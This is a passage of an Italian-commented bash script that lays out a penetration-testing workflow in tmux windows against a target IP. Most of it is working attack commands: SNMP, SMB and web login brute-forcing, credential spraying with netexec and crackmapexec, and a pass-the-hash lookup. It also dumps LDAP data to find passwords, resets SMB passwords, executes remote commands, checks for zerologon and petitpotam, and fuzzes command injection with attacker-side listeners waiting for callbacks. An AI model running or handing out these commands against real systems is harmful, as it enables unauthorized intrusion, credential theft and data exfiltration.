tmux send-keys -t PT:17.0 "printf \"\nThe commands to query a WMI service must be executed on a Windows powershell. \nPlease refer to the manual 'Cyber Security: practical guide to the secrets of ethical hacking'\"" Enter
cd $folderProject

cd $folderProjectAuthN
# IMAP
tmux new-window -t PT:18 -n '[143,993] IMAP'
tmux split-window -v -t PT:18.0
tmux split-window -v -t PT:18.1
tmux select-pane -t "18.1"
tmux split-window -h -t "18.1"
tmux split-window -v -t PT:18.3
tmux select-pane -t "18.3"
tmux split-window -h -t "18.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:18.0 "# IMAP: Service fingerprint" Enter
tmux send-keys -t PT:18.0 "nmap -sV -Pn -vv -p 143 --script=imap* $ip -oA out.143"
tmux send-keys -t PT:18.1 "# IMAP: get Banner (143 port)" Enter
tmux send-keys -t PT:18.1 "nc $ip 143"
tmux send-keys -t PT:18.2 "# IMAP: get Banner (993 port)" Enter
tmux send-keys -t PT:18.2 "nc --ssl $ip 993"
tmux send-keys -t PT:18.3 "printf \"\n# IMAP: get Emails\n# login <USER> <PASSWORD>\n# SELECT INBOX\n# FETCH 1:* (FLAGS BODY[HEADER.FIELDS (SUBJECT FROM DATE)])\n# FETCH 1 BODY[]\n# LOGOUT\" " Enter
tmux send-keys -t PT:18.3 "nc $ip 143"
tmux send-keys -t PT:18.4 "printf \"\n# IMAP: get Emails\n# login <USER> <PASSWORD>\n# SELECT INBOX\n# FETCH 1:* (FLAGS BODY[HEADER.FIELDS (SUBJECT FROM DATE)])\n# FETCH 1 BODY[]\n# LOGOUT\" " Enter
tmux send-keys -t PT:18.4 "nc --ssl $ip 993"
cd $folderProject

cd $folderProjectAuthN
# SNMP
tmux new-window -t PT:19 -n '[161,162] SNMP'
tmux split-window -v -t PT:19.0
tmux split-window -v -t PT:19.1
tmux select-pane -t "19.1"
tmux split-window -h -t "19.1"
tmux split-window -v -t PT:19.3
tmux select-pane -t "19.3"
tmux split-window -h -t "19.3"
tmux split-window -h -t "19.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:19.0 "# SNMP: Service fingerprint" Enter
tmux send-keys -t PT:19.0 "nmap -sU -Pn -vv -p 161 --script=snmp* $ip -oA out.161"
tmux send-keys -t PT:19.1 "# SNMP: bruteforce community string with onwsixtyone" Enter
tmux send-keys -t PT:19.1 "onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt $ip"
tmux send-keys -t PT:19.2 "# SNMP: bruteforce community string with hydra" Enter
tmux send-keys -t PT:19.2 "hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $ip snmp"
tmux send-keys -t PT:19.3 "printf \"\n# SNMP: Information Exposure with snmpwalk\n# Please set:\n# - version and\n# - comminuty string\n# at the begining of the script\n\" " Enter
tmux send-keys -t PT:19.3 "version=\"2c\" && community=\"public\" && ip=$ip && echo \"Retrieving network interface information\" && snmpwalk -v\$version -c \$community \$ip 1.3.6.1.2.1.4.34.1.3 && echo \"Retrieving Windows user information\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.4.1.77.1.2.25 && echo \"Retrieving active processes on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.25.4.2.1.2 && echo \"Retrieving TCP open ports on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.6.13.1.3 && echo \"Retrieving installed software on Windows\" && snmpwalk -c \$community -v \$version \$ip 1.3.6.1.2.1.25.6.3.1.2 && echo \"Running SNMPWalk to retrieve general information\" && snmpwalk -v\$version -c \$community \$ip && echo \"Scan completed.\""
tmux send-keys -t PT:19.4 "# SNMP: Information Exposure with snmpenum" Enter
tmux send-keys -t PT:19.4 "snmpenum $ip public /opt/snmpenum/linux.txt"
tmux send-keys -t PT:19.5 "# SNMP: Information Exposure - get IPV6 information from SNMP (Enyx)" Enter
tmux send-keys -t PT:19.5 "python /opt/enyx/Enyx/Enyx_v3.py 1 public $ip"
cd $folderProject

cd $folderProjectAuthN
# Active Directory
tmux new-window -t PT:20 -n '[389,636] Active Directory'
tmux split-window -v -t PT:20.0
tmux split-window -v -t PT:20.1
tmux split-window -v -t PT:20.2
tmux select-pane -t "20.2"
tmux split-window -h -t "20.2"
tmux split-window -h -t "20.2"
tmux split-window -v -t PT:20.5
tmux select-pane -t "20.5"
tmux split-window -h -t "20.5"
tmux split-window -h -t "20.5"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:20.0 "# AD: Service fingerprint" Enter
tmux send-keys -t PT:20.0 "nmap -sU -Pn -vv -p 389 --script=ldap* $ip -oA out.389"
tmux send-keys -t PT:20.1 "# AD: anonymous authentication" Enter
tmux send-keys -t PT:20.1 "ldapsearch -x -H ldap://$ip:389 -D '' -w ''"
tmux send-keys -t PT:20.2 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.2 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -s base namingcontexts"
tmux send-keys -t PT:20.3 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.3 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -s base -b '' \"(objectClass=*)\" \"*\" +"
tmux send-keys -t PT:20.4 "printf \"\n# AD: get Domain Naming Context\n# The username can be provided with these formalisms:\n# username@targetDomain.ctf\n# cn=username,dc=targetDomain,dc=ctf\n# targetDomain.ctf\username\n\" " Enter
tmux send-keys -t PT:20.4 "nmap -p 389 --script ldap-rootdse -Pn $ip"
tmux send-keys -t PT:20.5 "# AD: get all information from Active Directory" Enter
tmux send-keys -t PT:20.5 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub"
tmux send-keys -t PT:20.6 "# AD: get all information from Active Directory filtering them with grep (e.g. to find password)" Enter
tmux send-keys -t PT:20.6 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub | grep –I –A2 –B2 password"
tmux send-keys -t PT:20.7 "# AD: get all information from Active Directory filtering them with specific query (e.g. user, person, doamin user)" Enter
tmux send-keys -t PT:20.7 "ldapsearch -x -H ldap://$ip:389 -D '<USER>' -w '<PASS>' -b \"dc=targetDomain,dc=ctf\" –s sub \"(|(objectClass=person)(objectClass=user)(objectClass=Domain User))\""
cd $folderProject

cd $folderProjectAuthN
# SMB Enumeration
tmux new-window -t PT:21 -n '[389,636] SMB Enumeration'
tmux split-window -v -t PT:21.0
tmux resize-pane -t PT:21.0 -y 3
tmux split-window -v -t PT:21.1
tmux split-window -v -t PT:21.2
tmux select-pane -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -h -t "21.2"
tmux split-window -v -t PT:21.7
tmux select-pane -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -h -t "21.7"
tmux split-window -v -t PT:21.12
tmux select-pane -t "21.12"
tmux split-window -h -t "21.12"
tmux split-window -h -t "21.12"
tmux split-window -h -t "21.12"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:21.0 "# SMB: Service fingerprint" Enter
tmux send-keys -t PT:21.0 "nmap -sU -Pn -vv -p 445 --script=smb* $ip -oA out.445"
tmux send-keys -t PT:21.1 "# SMB: Bruteforce SMB2" Enter
tmux send-keys -t PT:21.1 "sudo /opt/thc-hydra/hydra -L users.txt -P passwords.txt -v $ip smb2"
tmux send-keys -t PT:21.2 "# SMB: Enum All via enum4linux" Enter
tmux send-keys -t PT:21.2 "enum4linux -a -u 'USER' -p 'PASS' $ip && echo "" && enum4linux -a -u '' -p '' $ip"
tmux send-keys -t PT:21.3 "# SMB: Enum User and Group via RCP" Enter
tmux send-keys -t PT:21.3 "sudo python rpcclient.py -u <USER> -p <PASS> $ip"
tmux send-keys -t PT:21.4 "# SMB: Enum netBIOS name, IP, MAC via netBIOS" Enter
tmux send-keys -t PT:21.4 "subnet=\"${ip%.*}.0/24\"" Enter
tmux send-keys -t PT:21.4 "nbtscan $subnet"
tmux send-keys -t PT:21.5 "# SMB: Enum netBIOS name, IP, MAC via netBIOS" Enter
tmux send-keys -t PT:21.5 "nmblookup -A $ip"
tmux send-keys -t PT:21.6 "# SMB: Enum SMB version, domain name, target name, target OS via NTLM" Enter
tmux send-keys -t PT:21.6 "sudo python /usr/share/doc/python3-impacket/examples/DumpNTLMInfo.py $ip"
tmux send-keys -t PT:21.7 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.7 "netexec smb $ip -u 'USER' -p 'PASS' --rid-brute 10000"
tmux send-keys -t PT:21.8 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.8 "crackmapexec smb $ip -u 'USER' -p 'PASS' --users --groups --pass-pol --loggedon-users --rid-brute"
tmux send-keys -t PT:21.9 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.9 "python /usr/share/doc/python3-impacket/examples/lookupsid.py 'USER:PASS'@$ip"
tmux send-keys -t PT:21.10 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.10 "/usr/share/doc/python3-impacket/examples/lookupsid.py -hashes 'aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef' '$domain/USER@$ip'"
tmux send-keys -t PT:21.11 "# SMB: Enum New Users" Enter
tmux send-keys -t PT:21.11 "impacket-net '<USER>':'<PASS>'@$ip user'"
tmux send-keys -t PT:21.12 "# SMB: Enum Domain Group" Enter
tmux send-keys -t PT:21.12 "impacket-net '<USER>':'<PASS>'@$ip group"
tmux send-keys -t PT:21.13 "# SMB: Enum Domain Group" Enter
tmux send-keys -t PT:21.13 "crackmapexec smb $ip -u 'USER' -p 'PASS' -d '$domain' --groups"
tmux send-keys -t PT:21.14 "# SMB: Enum Local Group" Enter
tmux send-keys -t PT:21.14 "impacket-net '<USER>':'<PASS>'@$ip localgroup"
tmux send-keys -t PT:21.15 "# SMB: Enum Local Group" Enter
tmux send-keys -t PT:21.15 "crackmapexec smb $ip -u 'USER' -p 'PASS' -d '$domain' --local-groups"
cd $folderProject

cd $folderProjectAuthN
# SMB Credential Verification
tmux new-window -t PT:22 -n '[389,636] SMB Credential Verification & Reset Password'
tmux split-window -v -t PT:22.0
tmux select-pane -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -h -t "22.0"
tmux split-window -v -t PT:22.3
tmux select-pane -t "22.3"
tmux split-window -h -t "22.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:22.0 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.0 "netexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" && netexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && netexec smb $ip -u 'dontknow' -p '' --continue-on-success && echo "" && netexec smb $ip -u '' -p '' --continue-on-success"
tmux send-keys -t PT:22.1 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --continue-on-success && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --no-bruteforce --continue-on-success && echo "" && crackmapexec smb $ip -u '' -p '' --no-bruteforce --continue-on-success"
tmux send-keys -t PT:22.2 "# SMB Credential Verification" Enter
tmux send-keys -t PT:22.2 "msfconsole -x "use auxiliary/scanner/smb/smb_login; set RHOSTS $ip ; set USER_FILE users.txt ; set PASS_FILE passwords.txt ; set DOMAIN $domain ; run""
tmux send-keys -t PT:22.3 "# SMB Reset Password" Enter
tmux send-keys -t PT:22.3 "smbpasswd -U <USER> -r $ip"
tmux send-keys -t PT:22.4 "# SMB Reset Password" Enter
tmux send-keys -t PT:22.4 "python $folderProjectEngine/resetSMBpass.py -t $ip -u <USER> -p <PASS> -n <NEW-PASS> -f users.txt"
cd $folderProject

cd $folderProjectAuthN
# SMB Credential Verification
tmux new-window -t PT:23 -n '[389,636] SMB Shared Folders'
tmux split-window -v -t PT:23.0
tmux select-pane -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -h -t "23.0"
tmux split-window -v -t PT:23.4
tmux select-pane -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -h -t "23.4"
tmux split-window -v -t PT:23.10
tmux select-pane -t "23.10"
tmux split-window -h -t "23.10"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:23.0 "# SMB find Shared Folders" Enter
tmux send-keys -t PT:23.0 "netexec smb $ip -u users.txt -p passwords.txt --shares && echo "" && netexec smb $ip -u users.txt -p users.txt --shares && echo "" && netexec smb $ip -u 'dontknow' -p '' --shares && echo "" && netexec smb $ip -u '' -p '' --shares" 
tmux send-keys -t PT:23.1 "# SMB find Shared Folders" Enter
tmux send-keys -t PT:23.1 "crackmapexec smb $ip -u users.txt -p passwords.txt --shares && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt --shares && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' --shares && echo "" && crackmapexec smb $ip -u '' -p ''" 
tmux send-keys -t PT:23.2 "# SMB find Shared Folders (with spider_plus)" Enter
tmux send-keys -t PT:23.2 "netexec smb $ip -u users.txt -p passwords.txt -M spider_plus && echo "" && netexec smb $ip -u users.txt -p users.txt -M spider_plus && echo "" && netexec smb $ip -u 'dontknow' -p '' -M spider_plus && echo "" && netexec smb $ip -u '' -p '' -M spider_plus" 
tmux send-keys -t PT:23.3 "# SMB find Shared Folders (with spider_plus)" Enter
tmux send-keys -t PT:23.3 "crackmapexec smb $ip -u users.txt -p passwords.txt -M spider_plus && echo "" &&  crackmapexec smb $ip -u users.txt -p users.txt -M spider_plus && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' -M spider_plus && echo "" && crackmapexec smb $ip -u 'dontknow' -p '' -M spider_plus"
tmux send-keys -t PT:23.4 "# SMB Read Shared Folders" Enter 
tmux send-keys -t PT:23.4 "smbmap -H $ip -u USER -p PASS -r --depth 5"
tmux send-keys -t PT:23.5 "# SMB Download Shared Folders" Enter 
tmux send-keys -t PT:23.5 "smbmap -R $sharename -H $ip -A FILE -q"
tmux send-keys -t PT:23.6 "# SMB Read Shared Folders" Enter 
tmux send-keys -t PT:23.6 "xdg-open smb://$ip/"
tmux send-keys -t PT:23.7 "# SMB Download Shared Folders" Enter 
tmux send-keys -t PT:23.7 "smbclient -U <USER>:<PASS> //$ip/<remote folder> -N -c 'prompt OFF;recurse ON;lcd '<local kali folder>';mget *'"
tmux send-keys -t PT:23.8 "printf \"\n# SMB: Read Shared Folders\n# To download file use these commands\n# smb> prompt off\n# smb> recurse on\n# smb> mget *\n\" " Enter
tmux send-keys -t PT:23.8 "smbclient -u 'USER' -p 'PASS' -L \\\\$ip\\SHARE-FOLDER"
tmux send-keys -t PT:23.9 "# SMB Mount Shared Folders" Enter 
tmux send-keys -t PT:23.9 "mount -t cifs -o "username=USER,password=PASS,domain=$domain" //$ip/share /mnt/share"
tmux send-keys -t PT:23.10 "printf \"\n# SMB: If you get the error\n# ls: cannot open directory: Permission denied\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\" " Enter
tmux send-keys -t PT:23.11 "printf \"\n# SMB: To find hidden files\n# Please refer to the manual 'Cyber Security: guida pratica ai segreti dell’hacking etico nel 2025'\n\" " Enter
cd $folderProject

cd $folderProjectAuthN
# SMB Execute command - Vulnerabilities - Reverse Shell
tmux new-window -t PT:24 -n '[389,636] SMB Execute command - Vulnerabilities - Reverse Shell'
tmux split-window -v -t PT:24.0
tmux select-pane -t "24.0"
tmux split-window -h -t "24.0"
tmux split-window -v -t PT:24.2
tmux split-window -v -t PT:24.3
tmux select-pane -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -h -t "24.3"
tmux split-window -v -t PT:24.8
tmux select-pane -t "24.8"
tmux split-window -h -t "24.8"
tmux split-window -h -t "24.8"
tmux split-window -h -t "24.8"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:24.0 "# SMB Execute Command" Enter
tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command>"
tmux send-keys -t PT:24.0 "# SMB Execute Command" Enter
tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u 'USER' -p 'PASS'  –x <command> --force-ps32"
tmux send-keys -t PT:24.0 "# SMB Known Vulnerabilities" Enter
tmux send-keys -t PT:24.0 "crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M zerologon && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M nopac && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M petitpotam && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M shadowcoerce && crackmapexec smb $ip -u <USER> -p <PASS> -d 'WORKGROUP' -M dfscoerce"
cd $folderProject

# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;














        7)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB Service AuthN bypass: brute force, command injection, webDAV, etc
######################
######################
# XXX open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter
tmux send-keys "cd $folderProjectWebAuthN" Enter

# WEB Command Injection
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:1 -n 'WEB Command Injection'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux select-pane -t "1.1"
tmux split-window -h -t "1.1"
tmux split-window -h -t "1.1"
tmux select-pane -t "1.4"
tmux split-window -h -t "1.4"
tmux split-window -h -t "1.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# automate command injection scan" Enter
tmux send-keys -t PT:1.0 "sudo uniscan -u $url -qweds"
tmux send-keys -t PT:1.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:1.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:1.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:1.2 "python3 -m http.server 80"
tmux send-keys -t PT:1.3 "# activate listener SMB" Enter
tmux send-keys -t PT:1.3 "impacket-smbserver -smb2support htb \$(pwd)"
#Preparo il file per le command injection
cd $folderProjectEngine
#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
python ./cmdGenerator.py $attackerIP cmdlist.txt
mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
cd $folderProjectWebAuthN
#sleep 1
tmux send-keys -t PT:1.4"# command injection automation (save burp file with name: burp.req)" Enter
tmux send-keys -t PT:1.4 "ffuf -request burp.req -request-proto http -w $folderProjectWebAuthN/out-command-injection-list.txt"
tmux send-keys -t PT:1.5"# command injection automation (GET)" Enter
tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 $url/?id=FUZZ"
tmux send-keys -t PT:1.6 "# command injection automation (POST)" Enter
tmux send-keys -t PT:1.6 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 $url/login.php # cmd injection (POST)"
cd $folderProject



# WEB Bruteforce AuthN
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:2 -n 'WEB Bruteforce AuthN'
tmux split-window -v -t PT:2.0
tmux split-window -v -t PT:2.1
tmux split-window -v -t PT:2.2
tmux select-pane -t "2.1"
tmux split-window -h -t "2.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "# find valid dictionary for bruteforce" Enter
tmux send-keys -t PT:2.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:2.1 "# bruteforce POST authN" Enter
tmux send-keys -t PT:2.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
tmux send-keys -t PT:2.2 "# bruteforce POST authN with BurpSuite saved request" Enter
tmux send-keys -t PT:2.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
tmux send-keys -t PT:2.3 "# bruteforce BasicAuth authN" Enter
tmux send-keys -t PT:2.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
tmux send-keys -t PT:2.4 "# bruteforce CMS" Enter
tmux send-keys -t PT:2.4 "sudo python /opt/CMSmap/cmsmap.py $url -u $pathFile_users -p $pathFile_passwords -f W"
cd $folderProject



# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;







        *)
            echo "Scelta non valida. Per favore, scegli un numero da 0 a 6."
            ;;
    esac
done
